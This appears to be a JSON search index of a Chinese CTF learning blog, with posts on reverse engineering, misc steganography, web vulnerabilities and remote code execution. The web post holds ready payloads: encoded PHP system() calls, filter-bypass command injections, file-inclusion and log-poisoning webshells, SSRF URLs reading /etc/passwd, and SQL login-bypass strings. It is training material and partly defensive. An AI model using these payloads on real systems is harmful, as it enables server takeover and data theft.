[{"title":"Reverse一点心得","url":"/2024/09/21/Reverse%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97/","content":"安全无止境，继续前进吧！\n11100101 10100100 10010110 11100111 10010101 10001100 11101000 10100111 10001010 11101000 10100111 10001110 11100111 10011101 10000000 11100111 10111101 10010111 11100101 10111110 10110111 11100101 10110010 10011011 11100111 10011010 10000100 11100110 10001000 10011000 11100100 10111010 10001011 11100110 10011100 10111010 11100101 10101111 10000110 11101111 10111100 10001100 00001010 11100100 10111010 10001110 11100110 10011000 10101111 11100100 10111101 10111111 11100111 10010100 10101000 11100100 10111000 10000000 11100100 10111010 10011011 11100110 10011100 10101000 11101001 10101001 10101100 11100111 10101000 10001011 11100101 10111010 10001111 11100100 10111100 10000001 11100101 10011011 10111110 11100100 10111011 10001110 11100101 10000110 10000101 11101001 10000011 10101000 11100110 10010100 10111011 11100111 10100000 10110100 01010000 01010010 01010100 01010011 11100111 10110011 10111011 11100111 10111011 10011111 11101111 10111100 10001100 00001010 11100111 10111101 10010111 11100101 10111110 10110111 11100101 10110010 10011011 11100101 10101110 10001001 11100101 10000101 10101000 11101001 10000011 10101000 11100101 10101111 10111001 11100110 10101101 10100100 11101001 10101011 10011000 11100101 10111010 10100110 11101001 10000111 10001101 11101000 10100111 10000110 11101111 10111100 10001100 11100101 10111100 10000000 11100101 10110001 10010101 11100100 10111010 10000110 11100100 10111000 10000000 11100111 10110011 10111011 11100101 10001000 10010111 11100101 10001000 10000110 11100110 10011110 10010000 11100111 10010111 10000101 11100110 10101111 10010010 11100111 10011010 10000100 11100101 10110111 10100101 11100100 10111101 10011100 11100010 10000000 10100110 11100010 10000000 10100110–by Ptilopsis\n\n代码逆向搞代码逆向，你需要对目标语言有所掌握，常见的是汇编语言和Python；\n\n程序逆向搞程序逆向，你需要认识一个叫做IDA的软件，还有分析汇编语言的能力；\n\n一点伪装\n想要在运输过程中瞒天过海，你需要对程序进行加壳，其实就是压缩；\n通过篡改或删除程序头（PE头更常见），使得程序不能正常执行；\n\n"},{"title":"Misc打杂圣经","url":"/2024/09/21/Misc%E6%89%93%E6%9D%82%E5%9C%A3%E7%BB%8F/","content":"安全无止境，继续前进吧！\n为了更好地带领罗德岛的大家进行安全入门，我们开设了这个misc板块，这里罗列了一些信息隐藏的方式供大家参考学习，祝大家学有所成。–by Amiya\n\n玩转压缩包\n密码爆破 当密码比较简单时，在穷举法面前不堪一击；\n\n伪加密 篡改加密标识符，即便没有加密也打不开压缩包；\n\nCRC32碰撞\n\n明文攻击 当你拥有压缩包内原本的文件时，你可以通过将源文件压缩构造明文实施明文攻击解开它；\n\n\n神奇的图片\n宽高更改 更改图片宽高信息，使别人不能直接看到图片下方的区域。 务必注意：只有png图片能够实现这种隐写方式！\n\n盲水印 有些水印是肉眼看不见的，你需要排除一下图片花花绿绿的干扰；\n\n文件融合 使用copy命令可以实现文件两两融合，破解它需要用到binwalk\n$ copy$ binwalk -e FileName\n 如果融合的文件类型不一样，有时更改后缀名就可以发现端倪；\n\n网络迷踪 通过图片透露的所有细节，推测出图片的拍摄地点等信息，比较考验你的地理水平。\n\nSSTV 这是一种将图片以音频形式传播的一种手段，通常用于无线电传输， 使用MM-SSTV或者RX-SSTV就可以实现音频转图片了。\n\n各种二维码 常见的是使用二进制码转成二维码。除了二维码，还有一些不太常见的图片式编码，如：汉信码，条码等；\n\n\n文本隐写的N种芝士\nHEX隐写： 这种隐写方式属于比较直接的，使用HxD或者010Editor查看十六进制码即可，flag一般出现在末尾处；\n\n0宽隐写 利用不同字符所占据空间不同的特性，在长文本中夹杂一些简短的文本信息；\n\nSNOW隐写\n\nNTFS数据流（ADS） 病毒常玩套路之一。通过在文件后端插入隐形数据流，当文件被打开时，数据流同时被读取，悄无声息。\n\n\n"},{"title":"Web一点心得","url":"/2024/09/21/Web%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97/","content":"安全无止境，继续前进吧！\n罗德岛的PRTS依赖于强大的网络系统，相应地，网络安全尤为重要，这关乎全岛各项事务的正常运作，希望你能够以身作则，祝你好运。–by Kal’tsit\n\n信息收集源码泄露\n开发注释未及时删除,按F12可以查看源码获取信息；\n\n有些网页设置了js前台绕过无法按F12，在网址前端添加view-source:或者前往浏览器设置关闭javascript即可绕过；\n\n对于采用PHP语言且缺乏防护的网页，通过以下访问手段可以获取到网页PHP源代码；\nurl/index.phpsurl/www.zip\n\n版本控制泄露\nurl/.git/index.php\n\n敏感数据泄露\nrobots后台泄露 robots.txt规定了用户能够访问网页的范围； 缺乏防护时，访问robots.txt可以获取到网页关键路径等信息；\nurl/robots.txt\n\n探针泄露 开发完成后，未及时删除的探针可能导致信息泄露； 记得删除探针，或者将探针命名为复杂不易猜的名字。\nurl/tz.php\n\ncookie泄露 cookie的本质是一个文档，它会记录用户的访问信息； 如果没有对cookie设置HttpOnly属性，一旦被截获就会造成信息泄露；\n\n数据库恶意下载 mdb文件是早期asp + access架构的数据库文件，文件泄露相当于数据库被脱裤了； 与此同时，备份的sql文件也可能会泄露敏感信息；\nurl/db/db.mdburl/backup.sql\n\n暴力破解想要实现网页爆破，你需要学会使用Burpsuite\n\n纯数字情形 对于纯数字组合的信息，可以使用Burpsuite设置区间构造字典实施爆破。爆破完成后，通过返回长度可以很容易地确认密码，随后查看响应内容获取信息。\n\n一般情形 如果爆破内容包含了字母以及特殊字符，也可以采用上面的方法，但是比较费时间。最好调用自己提前准备好的字典，后面的操作方法同上。\n\n随机数情形 如果要爆破的信息是用随机数种子动态生成的，就不要头铁爆破了（这里用到了伪随机数漏洞，详见下文）。先在本地搭建好PHP环境或Linux环境，然后调用靶场的随机数种子生成随机数，最后传参。\n\n\n命令执行命令执行，需要严格的过滤。攻击者需要想方设法绕过重重过滤。\n敏感词汇过滤\n文件名&#x2F;扩展名过滤 使用*或?替换掉部分文件名和扩展名，前者可以替换掉一个字符，后者可以一次替换掉多个字符; 或者在词汇中间插入’’或者\\绕过检测；\n函数名过滤 当system被过滤时，使用echo command;执行系统命令； 如果echo被过滤，使用nl命令；\n拼接法 通过构造与调用参数拼接敏感词汇，也能够绕过检测；\n包含法?file=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=index.php\n\n敏感字符过滤\n分号;过滤 使用%0a代替分号；\n空格过滤 在echo没有被过滤的情况下，使用$IFS（echo适用）或${IFS}代替空格； 如果echo被过滤，使用%09代替空格（%09是Tab键的url编码）； 如果$或IFS被过滤，可以获取并调用php环境中与空格等效的标识符；\n\n数字、字母过滤如果遇到了所有字母和数字都被过滤的极端情况，使用以下几种方法：\n\nphp异或 将系统命令异或处理后传入（需要保证密文和密钥均不包含字母和数字）；\nsystem(&#x27;ls&#x27;);-&gt;(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);system(&#x27;tac flag.php&#x27;);-&gt;(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);\n\nphp或 与异或相似，操作是差不多的。\nsystem(&#x27;ls&#x27;);-&gt;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);system(&#x27;tac flag.php&#x27;);-&gt;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;);\n\nphp自增\n\nphp取反\nsystem(&#x27;ls&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%93%8C);system(&#x27;tac flag.php&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);\n\n脚本地址（by yu22x）：https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501\n需要注意的是：在Linux系统中，system()函数不支持以上操作！    此外，当$、+、-、^、~、|这些字符被过滤后，以上方法将失效。\n举些例子（以下题目来自ctfshow）：&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;payload:    ?c=system(&#x27;ls&#x27;);    ?c=system(&#x27;tac fl*g.php&#x27;);\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;payload:    ?c=echo `ls`;    ?c=echo `tac fl*g.*`;    ?c=echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;  // 适用于*被过滤的情况拼接法：    ?c=$a=sys;$b=tem;$c=$a.$b;$c(&#x27;ls&#x27;);    ?c=$a=sys;$b=tem;$c=&quot;$&#123;a&#125;$&#123;b&#125;&quot;;$c(&#x27;ls&#x27;);\n\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);payload:    ?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php&#125;\n\n&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;payload:    ?c=tac&lt;fl&#x27;&#x27;ag.php||    ?c=ta&#x27;&#x27;c&lt;fl&#x27;&#x27;ag.php||  // 适用于tac被过滤的情况\n\n&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;payload:    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;ls&quot;);    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;tac%20flag.php&quot;);// get_defined_vars(void)：返回一个包含所有已定义变量列表的多维数组，可以替代任意变量。这些变量包括环境变量、服务器变量和用户定义的变量。     \n\n\n漏洞利用伪随机数漏洞有时候，我们需要一定的认证手段防范恶意攻击，比如说使用随机数。但是，在同一个随机数种子下，随机数的序列是相同的。\n文件包含漏洞使用各类文件包含指令，对目标实施攻击；\n\ndata包含 用于执行一句话木马，查找并获取flag。\n?file=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;?file=data://text/plain,&lt;?php system(&quot;ls *.php&quot;)?&gt;  // 仅查找.php文件?file=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;?file=data://text/plain,&lt;?php system(&quot;tac fl*g.*&quot;)?&gt;  // 绕过flag，php过滤?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=   //绕过system，&lt;?过滤\n\nfilter包含 用于获取网页PHP源代码，但在不知道flag在哪时不好用。\n?file=php://filter/read=convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=index.php\n\nhttp日志包含 nginx默认日志路径。配合burpsuite使用，与data包含功能相似，伟大无需多言。\n?file=/var/log/nginx/access.log?file=/../../../access.log   // 路径穿越\n包含前，拦截http请求头，在ua信息末尾插入一句话木马（一般用来传参）后放行请求头；传参后，在日志包含口令后面添加系统命令，随后可以找到flag；\n/* 假设已经上传的参数为1 */?file=/var/log/nginx/access.log&amp;1=system(&#x27;ls *.php&#x27;);?file=/var/log/nginx/access.log&amp;1=system(&#x27;tac flag.php&#x27;);\n\nSSH日志包含 与http日志包含相似，利用恶意用户名注入一句话木马；\n?file=/var/log/auth.log?file=/var/log/secure\n请注意：日志文件会记录最为原始的URL请求，在浏览器地址栏中输入的地址会被URL编码，通过CURl或者Burp改包绕过编码。\n\nsession包含PHP将用户session以文件的形式保存在主机中，通过php.ini文件中的session.save_path字段可以设置具体的存储位置，通过phpinfo页面也可以查询到；一些可能的session文件存放路径：\n?file=/var/lib/php/sess_PHPSESSID?file=/var/lib/php/sessions/sess_PHPSESSID?file=/tmp/sess_PHPSESSID?file=/tmp/sessions/sess_PHPSESSID\n\nphpinfo_lfi\n\n竞争条件\n\n\n文件上传漏洞通过在上传的文件中插入一句话木马，在缺乏防护的情况下，可以实现对服务器的命令控制；\nXSS跨站脚本漏洞过滤验证很重要，但如果只设置javascript前端验证，忽略了后端验证，就会留下跨站脚本漏洞。\n比如说，我们要在网页上输入一段信息，javascript验证可以在提交数据之前过滤掉敏感字符，这样主要是为了防止用户输入错误。\n然而，绕过javascript验证的思路也非常简单：先提交合法数据，再拦截上传的http(s)请求并将原先输入的合法数据修改为敏感数据，最后上传篡改后的http(s)请求，就能够成功提敏感数据，造成XSS漏洞。\n所以，设置服务器端验证是非常重要的攻击防护手段，每一位web开发人员都应当具有这样的意识。\nCSRF漏洞跨站请求伪造漏洞，黑客通过盗用身份建立会话，进行一系列非法操作，或者欺骗用户访问带有木马的url链接。传说中的钓鱼链接就是这样来的。\nurl + /vul/csrf/csrfget/csrf_get_edit.php? + 内容\n防护策略:\n\n要求用户进行二次确认；\n阻止不明外域的访问；\n提交时要求附加只有在本域才能获取的信息；\n增加token（令牌）验证（token需要随机生成，值足够大，用后需销毁）；\n增加验证码；\n\n请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！逻辑错误漏洞当一个系统的功能太多的时候，难免会出现由开发人员思路错误或思考不全面导致的程序逻辑问题，导致了逻辑漏洞；\n漏洞挖掘发现网页功能-&gt;了解业务流程-&gt;拦截、篡改http(s)请求\n\nSSRF漏洞如果服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，黑客可以通过伪造服务端请求对其他服务器实施攻击，一般用于攻击与外界隔离的内部服务器；\n利用方式\n探测内网信息；\n窃取敏感内容；\n作为跳板，攻击其他网站或应用；\n\n协议利用Dict协议dict://ip:portdict://ip:port/commandeg:dict://fuzz.wuyun.org:8000/helo:dict\nGopher协议gopher://ip:port/_TCP/IP数据流eg:gopher://fuzz.wuyun.org:8000/gopher\nFile协议file:///etc/passwd\n\n\nSQL注入细节决定成败，SQL注入玩的就是不严谨的语法。\n热身：万能密码绕过1&#x27; or &#x27;1&#x27;=&#x27;11&#x27; or 1=1 or &#x27;1&#x27;=&#x27;1\n原验证登陆语句:\nSELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;\n注入后的语句：\nSELECT * FROM admin WHERE Username=&#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;\n注入后，不论密码是否正确，1&#x3D;1 or ‘1’&#x3D;’1’永远成立，成功绕过密码环节。\n注入类型数字型注入一般出现在弱类型语言（如ASP、PHP等）中，因为这种语言会自动推导变量类型；而对于强类型语言（如Java、C#等），普通的类型转换会抛出异常而无法继续执行，所以一般不存在数字型注入漏洞。\n字符型注入注入芝士SQL Server\n错误信息收集 SQL Server能够准确定位错误信息，黑客可以利用错误信息提取数据。\n\n获取元数据\n\nUNION查询（联合查询）\n\n危险函数\n\n\nMySQL&lt;- To be continued"},{"title":"RCE漏洞浅析","url":"/2024/10/02/RCE%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/","content":"安全无止境，继续前进吧！\n告诉你一个好消息,博士：罗德岛安全部的漏洞分析工作取得了较大进展，这离不开安全部的大家日日夜夜的付出，也离不开你对这项工作的大力支持。我们决定对一些重要且较复杂的漏洞单独剔出以进行更详细的汇总，这个版块用来单独分析RCE漏洞，继续努力吧，博士，我会在后方默默守护你的。–by Civilight Eterna\nRCE，即远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n常见危险函数系统命令执行函数\nshell_exec()：将字符串作为OS命令执行\nsystem()：将字符串作为OS命令执行，且返回命令执行结果；\nexec()：将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；\npassthru()：将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；\npopen()：打开进程文件指针\nproc_open()：与popen()类似\npcntl_exec()：在当前进程空间执行指定程序；\n反引号&#96;&#96;：其中的字符串会被解析为OS命令；\n\n代码执行函数\neval()：将字符串作为php代码执行；\nassert()：将字符串作为php代码执行；\npreg_replace()：正则匹配替换字符串；\ncreate_function()：主要创建匿名函数；\ncall_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；\ncall_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；\n\nRCE绕过\n管道符\n空格过滤\n取反绕过\n异或绕过\n自增绕过\n黑名单绕过\nbase和hex编码绕过\n正则匹配绕过\n回溯绕过\n\nRCE命令执行\n无回显RCE\n无参数RCE\n无字母数字RCE\n\n危害\n继承Web服务器程序权限，去执行系统命令；\n继承Web服务器权限，读写文件；\n反弹shell；\n控制整个网站甚至是服务器；\n\n防护策略\n对用户的输入作严格的过滤，如白名单策略；\n尽量避免使用容易产生漏洞的危险函数；\n保证用户不调用控制危险函数的传参；\n\n&lt;- To be continued"}]